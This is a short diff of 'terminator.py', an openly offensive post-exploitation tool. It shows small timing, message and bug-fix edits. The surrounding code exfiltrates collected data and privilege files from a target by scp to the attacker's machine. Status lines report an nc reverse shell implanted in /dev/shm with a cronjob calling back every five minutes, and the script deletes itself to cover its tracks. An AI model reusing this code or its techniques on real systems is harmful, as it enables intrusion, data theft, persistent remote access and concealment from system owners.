@@ -65,7 +65,7 @@ print('''
 \\ https://github.com/suffs811/the-terminator.git
 ''')
 
-time.sleep(3)
+time.sleep(2)
 
 
 # enumeration ###############################
@@ -628,11 +628,11 @@ def export(local_ip):
 
    # get username of local user to scp files to
    u_root = input("\n\n### specify local username to send data to (for scp): ")
-   time.sleep(2)
+   time.sleep(1)
 
    # try to scp files to local machine using inputted username
    os.system("touch /tmp/scp.txt")
-   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n\n+input your password for local user {}+\n".format(u_root,local_ip,u_root))
+   print("\n### sending data to {}@{}/terminator/scp_output.txt... ###\n\n-+- input your password for local user {} -+-\n".format(u_root,local_ip,u_root))
    os.system("scp /tmp/data_exfil.txt /tmp/priv.txt {}@{}:/terminator/ && echo $? > /tmp/scp.txt".format(u_root,local_ip))
 
    with open("/tmp/scp.txt") as sc:
@@ -696,8 +696,6 @@ def clear_tracks(username,password,local_ip,local_port):
    print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
    print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))
 
-   print("\n### data_exfil.txt and priv.txt sent to {}/terminator/ ###\n".format(local_ip))
-
    # delete terminator.py file
    os.system("rm -f terminator.py")
    exit()
@@ -756,7 +754,7 @@ def doc_make(output):
    # get target ip from enum.txt
    ipf = open("/terminator/enum.txt")
    ipread = ipf.readline()
-   ipsplit = ipf.split(" ")
+   ipsplit = ipread.split(" ")
    ip = ipsplit[-2].strip()
 
    # check for .txt extension and get report name
